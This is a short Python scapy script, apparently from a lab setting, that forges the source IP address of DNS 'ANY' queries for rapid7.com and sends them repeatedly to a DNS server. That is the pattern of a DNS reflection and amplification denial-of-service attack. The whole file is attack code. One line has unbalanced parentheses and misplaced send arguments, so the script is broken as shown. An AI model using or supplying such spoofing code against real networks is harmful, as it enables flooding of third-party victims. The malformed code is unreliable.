from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
D= DNS(rd=1,qd=DNSQR(qname="rapid7.com",qtype="ANY",qclass="IN")),count=100,loop=1)

spoofed_packet = IP(src=A, dst=B) / UDP(sport=16863, dport=53) / D
send(spoofed_packet, count=10)